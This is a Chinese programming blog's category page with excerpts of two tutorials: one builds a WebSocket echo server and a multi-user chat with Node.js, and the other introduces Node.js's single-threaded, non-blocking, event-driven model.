<!doctype html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" >
    <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8" >
    <meta name="baidu-site-verification" content="dIcXMeY8Ya" />
    
    <title>`编程`分类下的文章 | zen&#39;s blog</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" >
    <meta name="keywords" content="Jelon, 前端, Web, 张德龙, 前端开发" >
    <meta name="description" content="Jelon个人前端小站" >

    
    <link rel="alternative" href="/atom.xml" title="zen&#39;s blog" type="application/atom+xml" >
    
    
    <link rel="shortcut icon" href="../../favicon.ico" >
    
    
<link rel="stylesheet" href="../../css/style.css">

    <!--[if lt IE 9]>
    
<script src="../../js/html5.js"></script>

    <![endif]-->
    
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d5ebf515ab530cfbdda5f5c85093fb41";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>


<meta name="generator" content="Hexo 4.2.0"></head>

<body class="home">
    <!--[if lt IE 9]>
    <div class="browsehappy">
        当前网页 <strong>不支持</strong>
        你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/" target="_blank" rel="noopener">升级你的浏览器</a>.
    </div>
    <![endif]-->

    <!-- 博客头部 -->
    <header class="header">
    <section class="container header-main">
        <div class="logo">
            <a href="../../index.html">
                <div class="cover">
                    <span class="name">zen&#39;s blog</span>
                    <span class="description"></span>
                </div>
            </a>
        </div>
        <div class="dropnav icon-paragraph-justify" id="JELON__btnDropNav"></div>
        <ul class="menu hidden" id="JELON__menu">
            
            <li rel="" class="item ">
                <a href="../../index.html" title="首页" class="icon-home">&nbsp;首页</a>
            </li>
            
            <li rel="" class="item ">
                <a href="../../lab/" title="实验室" class="icon-lab">&nbsp;实验室</a>
            </li>
            
            <li rel="" class="item ">
                <a href="../../about/" title="关于" class="icon-about">&nbsp;关于</a>
            </li>
            
            <li rel="" class="item ">
                <a href="../../comment/" title="留言" class="icon-comment">&nbsp;留言</a>
            </li>
            
        </ul>
        <div class="profile clearfix">
            <div class="feeds fl">
                
                
                <p class="links">
                    
                        <a href="https://github.com/jangdelong" target="_blank">Github</a>
                        |
                    
                        <a href="https://pages.coding.me" target="_blank">Hosted by Coding Pages</a>
                        
                    
                </p>
                <p class="sns">
                    
                        <a href="http://weibo.com/jangdelong" class="sinaweibo" target="_blank"><b>■</b> 新浪微博</a>
                    
                        <a href="https://www.facebook.com/profile.php?id=100011855760219&amp;ref=bookmarks" class="qqweibo" target="_blank"><b>■</b> Facebook</a>
                    
                    <a href="javascript: void(0);" class="wechat">
                        <b>■</b>
                        公众号
                        <span class="popover">
                            <img src="../../img/wechat_mp.jpg" width="120" height="120" alt="我的微信订阅号">
                            <i class="arrow"></i>
                        </span>
                    </a>
                </p>
                
            </div>
            <div class="avatar fr">
                <img src="/img/jelon.jpg" alt="avatar" title="Jelon" >
            </div>
        </div>
    </section>
</header>


    <!-- 博客正文 -->
    <div class="container body clearfix">
        <section class="content">
            <div class="content-main widget">
                <!-- 文章分类 -->

    <h3 class="widget-hd">
        <strong>
            
                `编程`分类下的文章
            
        </strong>
    </h3>
    
        <!-- 文章列表 item -->
<article class="post">
    <header>
        <!-- 标签这有且只能显示一个 -->
        
        <a class="cat-link" href="">编程</a>
        
        <!-- 文章标题 -->
        
    <h3 class="post-title">
    	<a href="../../http:/ymlog.cn/2020/05/03/WebSocket/">
    		WebSocket
    	</a>
    </h3>

    </header>
    <p class="post-meta">
        Jelon 发表于
        <time datetime="2020-05-03T11:28:35.000Z">2020-05-03</time>
        &nbsp;&nbsp;
        <span class="post-tags">
            标签：
            
        </span>
    </p>

    <div class="post-content">
        <div class="post-excerpt">
            
                <h1 id="WS介绍"><a href="#WS介绍" class="headerlink" title="WS介绍"></a>WS介绍</h1><p>HTTP</p>
<p>超文本传输协议(HTTP,HypertextTransferProtocol)是互联网上应用最为广泛的一种网络协议。是用于从WWW服务器传输超文本到本地浏览器的传送协议。</p>
<p>Web通讯</p>
<p><img src="https://i.loli.net/2020/05/03/ToOBRW7IeUilqa9.png" alt="image-20200503143751258.png"></p>
<p>WebSocket</p>
<p>WebSocket Protocal是HTML5一种新的协议，它实现了浏览器与服务器全双工通信（full-duple），一开始握手需要借助http请求完成。</p>
<p>HTTP请求是无状态的，每一次收发数据都需要建立连接。WebSocket不需要建立连接就可以收发数据。</p>
<p><img src="https://i.loli.net/2020/05/03/2e13BGHfSyCtAqs.png" alt="image-20200503143949598.png"></p>
<p>WebSocket对象提供一组API，用于创建和管理WebSocket连接，以及通过连接发送和接受数据。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">创建WebSocket对象</span><br><span class="line">var ws = new WebSocket(url,[protocals]);</span><br><span class="line"></span><br><span class="line">url: 表示要连接的URL，这个URL应该为响应WebSocket的地址</span><br><span class="line">protocals:可以是单个的协议名字字符串或者包含多个协议名字字符串的数组</span><br></pre></td></tr></table></figure>



<p>方法</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">close([code][,reason]) 关闭websocket连接或停止正在进行的连接请求</span><br><span class="line">code: 一个数字表示关闭连接的状态号，表示连接关闭的原因</span><br><span class="line">reason: 一个可读字符串，表示连接被关闭的原因</span><br><span class="line"></span><br><span class="line">send(data) 通过websocket连接，向服务器发送数据</span><br><span class="line">data: 一个数字值表示关闭连接的状态号，表示连接被关闭的原因</span><br></pre></td></tr></table></figure>



<p>属性</p>
<table>
<thead>
<tr>
<th>名词</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>onclose</td>
<td>用于监听连接关闭事件监听器。当WebSocket对象的ReadyState状态变为CLOSED时，会触发该事件。会接受一个close event对象</td>
</tr>
<tr>
<td>onerror</td>
<td>当错误发生时，用于监听error事件的事件监听器，会接受一个error event对象</td>
</tr>
<tr>
<td>onmessage</td>
<td>一个用于消息事件的事件监听器，这一事件当有消息到达的时候该事件会触发。会接受一个message event对象</td>
</tr>
<tr>
<td>onopen</td>
<td>一个用于连接打开事件的事件监听器，当readyState的值变为OPEN的时候会触发该事件，会接受一个open event对象</td>
</tr>
<tr>
<td>readyState</td>
<td>连接的当前状态 0 连接还没开启 1 连接已经开启并准备好进行通信 2 连接正在关闭的过程中 3 连接已经关闭，或者连接无法建立</td>
</tr>
</tbody></table>
<h1 id="简易的WS"><a href="#简易的WS" class="headerlink" title="简易的WS"></a>简易的WS</h1><p>npm安装websocket</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install websocket</span><br></pre></td></tr></table></figure>



<p>后端页面</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> WebSocketServer = <span class="built_in">require</span>(<span class="string">'websocket'</span>).server;</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建服务器</span></span><br><span class="line"><span class="keyword">var</span> server = http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">request, response</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log((<span class="keyword">new</span> <span class="built_in">Date</span>()) + <span class="string">' Received request for '</span> + request.url);</span><br><span class="line">    response.writeHead(<span class="number">404</span>);</span><br><span class="line">    response.end();</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 监听8080端口</span></span><br><span class="line">server.listen(<span class="number">3000</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log((<span class="keyword">new</span> <span class="built_in">Date</span>()) + <span class="string">' Server is listening on port 8080'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 创建websocket服务器</span></span><br><span class="line">wsServer = <span class="keyword">new</span> WebSocketServer(&#123;</span><br><span class="line">    httpServer: server,</span><br><span class="line">    autoAcceptConnections: <span class="literal">false</span></span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//websocket建立连接</span></span><br><span class="line">wsServer.on(<span class="string">'request'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">request</span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//当前的连接</span></span><br><span class="line">    <span class="keyword">var</span> connection = request.accept(<span class="literal">null</span>, request.origin);</span><br><span class="line">    <span class="built_in">console</span>.log((<span class="keyword">new</span> <span class="built_in">Date</span>()) + <span class="string">' Connection accepted.'</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//定时向客户端发送消息</span></span><br><span class="line">    setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        connection.sendUTF(<span class="string">"服务端发送新消息"</span>+(<span class="keyword">new</span> <span class="built_in">Date</span>()))</span><br><span class="line">    &#125;,<span class="number">1000</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 监听当前连接，发送message的时候</span></span><br><span class="line">    connection.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (message.type === <span class="string">'utf8'</span>) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'Received Message: '</span> + message.utf8Data);</span><br><span class="line">            connection.sendUTF(message.utf8Data);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (message.type === <span class="string">'binary'</span>) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'Received Binary Message of '</span> + message.binaryData.length + <span class="string">' bytes'</span>);</span><br><span class="line">            connection.sendBytes(message.binaryData);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 监听当前连接，当close的时候出发事件</span></span><br><span class="line">    connection.on(<span class="string">'close'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">reasonCode, description</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log((<span class="keyword">new</span> <span class="built_in">Date</span>()) + <span class="string">' Peer '</span> + connection.remoteAddress + <span class="string">' disconnected.'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<p>前端页面</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Websocket前端页面<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 创建websocket对象</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">"ws://localhost:3000"</span>);</span></span><br><span class="line">        </span><br><span class="line"><span class="actionscript">        <span class="comment">// 监听建立连接</span></span></span><br><span class="line"><span class="actionscript">        ws.onopen = <span class="function"><span class="keyword">function</span><span class="params">(res)</span></span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">"连接成功！"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(res);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="comment">//监听有新消息</span></span></span><br><span class="line"><span class="actionscript">        ws.onmessage = <span class="function"><span class="keyword">function</span><span class="params">(res)</span></span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">"有新消息！"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(res);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>页面效果</p>
<p><img src="https://i.loli.net/2020/05/03/4jEb27kvDXBKF8H.png" alt="image-20200503150850275.png"></p>
<h1 id="多人通讯"><a href="#多人通讯" class="headerlink" title="多人通讯"></a>多人通讯</h1><p>后端</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">"http"</span>)</span><br><span class="line"><span class="comment">// 引入websocket模块</span></span><br><span class="line"><span class="keyword">var</span> WebSocketServer = <span class="built_in">require</span>(<span class="string">'websocket'</span>).server</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//存储所有终端连接</span></span><br><span class="line"><span class="keyword">var</span> clients  = [];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入http模块，搭建http服务器</span></span><br><span class="line"><span class="keyword">var</span> server = http.createServer()</span><br><span class="line"><span class="comment">// server.listen(3000, ()=&gt; &#123;</span></span><br><span class="line"><span class="comment">//     console.log("服务器搭建成功！,监听localhost:3000")</span></span><br><span class="line"><span class="comment">// &#125;)</span></span><br><span class="line">server.listen(<span class="number">3000</span>,<span class="string">"0.0.0.0"</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"服务器创建成功"</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建websocket服务对象</span></span><br><span class="line"><span class="keyword">var</span> wsServer = <span class="keyword">new</span> WebSocketServer(&#123;<span class="attr">httpServer</span>:server&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听连接请求，建立连接</span></span><br><span class="line"><span class="comment">// webSocketRequest 当前连接建立的请求</span></span><br><span class="line">wsServer.on(<span class="string">'request'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">webSocketRequest</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"建立连接"</span>)</span><br><span class="line">    <span class="comment">// 当前连接 会话</span></span><br><span class="line">    <span class="keyword">var</span> connection = webSocketRequest.accept(<span class="literal">null</span>, <span class="string">'accepted-origin'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">//把连接添加到终端</span></span><br><span class="line">    clients.push(connection)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当客户端发来信息的时候 ,判断信息的两种类型</span></span><br><span class="line">    <span class="comment">// For Text Frames:</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     type: "utf8",</span></span><br><span class="line">    <span class="comment">//     utf8Data: "A string containing the received message."</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// // For Binary Frames:</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     type: "binary",</span></span><br><span class="line">    <span class="comment">//     binaryData: binaryDataBuffer // a Buffer object containing the binary message payload</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    connection.on(<span class="string">"message"</span>,<span class="function"><span class="keyword">function</span>(<span class="params">msg</span>)</span>&#123;</span><br><span class="line">        <span class="comment">// 如果是文本类型，则给每一个当前的连接都发送一遍</span></span><br><span class="line">        <span class="keyword">if</span>(msg.type == <span class="string">"utf8"</span>)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"遍历用户，发送数据...."</span>+msg.utf8Data)</span><br><span class="line">            <span class="comment">// 遍历连接数组，给每一个连接发送数据</span></span><br><span class="line">            clients.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>)</span>&#123;</span><br><span class="line">                <span class="comment">//发送数据</span></span><br><span class="line">                item.sendUTF(msg.utf8Data)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(msg)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当连接断开的时候 , 触发事件</span></span><br><span class="line">    connection.on(<span class="string">"close"</span>,<span class="function"><span class="keyword">function</span>(<span class="params">reasonCode,description</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"断开连接"</span>)</span><br><span class="line">        <span class="comment">// 获取当前索引，根据索引删除连接</span></span><br><span class="line">        <span class="keyword">var</span> index = clients.indexOf(connection)</span><br><span class="line">        <span class="comment">// 删除</span></span><br><span class="line">        clients.splice(index,<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<p>前端</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>多终端通信<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"msg"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"send()"</span>&gt;</span>SEND<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">"ws://localhost:3000"</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> inputNode = <span class="built_in">document</span>.getElementById(<span class="string">"msg"</span>)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ulCon = <span class="built_in">document</span>.getElementById(<span class="string">"content"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 将用户输入发送给服务端</span></span></span><br><span class="line">            ws.send(inputNode.value)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"><span class="actionscript">        ws.onopen = <span class="function"><span class="keyword">function</span><span class="params">(res)</span></span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">"连接成功！"</span>);</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"><span class="actionscript">        ws.onmessage=<span class="function"><span class="keyword">function</span><span class="params">(msg)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 接受服务端传来的数据</span></span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 这里不是msg.value，因为这里的msg是websocket的msg，不是id=msg的意思</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">"MSG.value:"</span>+msg.data)</span></span><br><span class="line"><span class="actionscript">            content.innerHTML+=<span class="string">'&lt;li&gt;'</span>+msg.data+<span class="string">'&lt;/li&gt;'</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


            
            <p class="more">
                <a href="../../http:/ymlog.cn/2020/05/03/WebSocket/">阅读剩下更多</a>
            </p>
        </div>
        <div class="post-thumbnail" data-img="">
            <a href="http://ymlog.cn/2020/05/03/WebSocket/" title="WebSocket">
                
                    <img class="thumbnail" src="../../img/default.png" data-echo="../../img/thumbnail/3.jpg" alt="默认配图" >
                
            </a>
        </div>
    </div>
</article>

    
        <!-- 文章列表 item -->
<article class="post">
    <header>
        <!-- 标签这有且只能显示一个 -->
        
        <a class="cat-link" href="">编程</a>
        
        <!-- 文章标题 -->
        
    <h3 class="post-title">
    	<a href="../../http:/ymlog.cn/2020/04/29/NodeJS_1/">
    		NodeJS（一） 静态路由
    	</a>
    </h3>

    </header>
    <p class="post-meta">
        Jelon 发表于
        <time datetime="2020-04-29T11:57:22.000Z">2020-04-29</time>
        &nbsp;&nbsp;
        <span class="post-tags">
            标签：
            
        </span>
    </p>

    <div class="post-content">
        <div class="post-excerpt">
            
                <h1 id="Nodejs简介"><a href="#Nodejs简介" class="headerlink" title="Nodejs简介"></a>Nodejs简介</h1><p>​    V8引擎本身是用于Chrome浏览器的JS解释部分，但是Ryan Dahl将其搬到了服务器上，用于做服务器。</p>
<p>​    浏览器和服务器类似，浏览器是发送HTTP请求，接受HTTP响应，服务器也是接受HTTP请求，发送HTTP响应。都已HTML的方式实现。</p>
<p>​    Nodejs是一个让Javascript运行在服务器端的开发平台，它让Javascript的触角伸到了服务器端，可以和PHP、JSP、Python、Ruby平起平坐。</p>
<p>不同之处：</p>
<ol>
<li>Nodejs不是一种独立的语言，与PHP、JSP、Python的“既是语言，也是平台不同，Nodejs的使用Javascript进行编程，运行在Javascript引擎上（V8）</li>
<li>与PHP、JSP相比，Nodejs跳过了Apache、Nginx、IIS等HTTP服务器，自己不用建设在任何服务器软件之上。</li>
</ol>
<p>Nodejs特点</p>
<ol>
<li>单线程</li>
<li>非阻塞IO</li>
<li>事件驱动</li>
</ol>
<p>1、单线程</p>
<p>在java、php等服务器端语言中，会为每个客户连接创建一个新的线程，每个线程耗费大约2MB的内存，理论上，一个8G内存的服务器可以同时连接的最大用户数为4000个。</p>
<p>Nodejs不为每个客户连接创建一个新的线程，而仅仅使用一个线程。当有用户连接了，就触发一个内部时间，通过非阻塞I/O、事件驱动机制，让Node.js程序宏观上也是并行的。使用Nodejs，一个8G的服务器可以同时处理超过4万用户的连接</p>
<p>另外，单线程带来的好处，还有操作系统完全不再有创建线程，销毁线程带来的时间开销。</p>
<p>但是，一个用户造成的线程崩溃，其他服务也就崩溃了。</p>
<p><img src="https://i.loli.net/2020/04/29/GgYacbvhxfnMFPp.png" alt="image-20200427100929280.png"></p>
<p>2、非阻塞I/O（non-blocking IO）</p>
<p>例如，当在访问数据库取得数据的时候，需要一段时间。在传统的单线程处理机制中，在执行了访问数据库代码之后，整个线程都将暂停下来，等待数据库返回结果，才能执行后面的代码。也就是说，I/O阻塞了代码的执行，极大的降低了程序的执行效率。</p>
<p>由于Nodejs采用了非阻塞I/O机制，因此在执行访问数据库代码之后，将立即转而执行后面的代码，把数据库返回结果的处理代码放在回调函数中，从而提高了程序执行效率。</p>
<p>当某个I/O执行完毕时，将以事件的形式同之I/O操作的线程，线程执行这个事件的回调函数，为了处理异步I/O，线程必须有事件循环，不断的检查有没有未处理的事件。</p>
<p>阻塞模式下，一个线程只能处理一项任务，想要提高吞吐量必须通过多线程，而非阻塞模式下，一个线程永远在执行计算操作，这个线程的CPU核心利用率永远是100%。</p>
<p>3、事件驱动（event-driven）</p>
<p>在Node中，客户端请求建立连接，提交数据等行为，会触发相应的事件，在Node中，一个时刻只能执行一个事件回调函数，但是在执行一个事件回调函数的中途，可以转而处理其他事件（比如又有新用户连接），然后返回据徐执行原事件的回调函数，这种处理机制，称为”时间环“</p>
<p>Nodejs底层时C++，底层代码中，近半数都是用于事件队列、回调函数队列的构建。</p>
